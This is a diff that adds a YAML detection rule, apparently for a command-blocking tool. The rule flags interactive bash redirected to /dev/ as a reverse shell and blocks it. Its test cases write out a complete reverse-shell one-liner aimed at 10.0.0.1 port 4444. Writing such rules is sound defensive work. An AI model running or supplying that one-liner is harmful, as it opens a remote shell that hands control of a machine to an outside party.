@@ -1,0 +1,11 @@
+# Interactive bash with its output redirected into a device or file.
+id: reverse-shell-interactive-bash
+severity: block
+category: reverse_shell
+match: /bash\s+-i\s+>&?\s*\/dev\//
+reason: interactive bash redirected to a device file looks like a reverse shell
+tests:
+  match:
+    - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+  no_match:
+    - bash -c "echo hi"
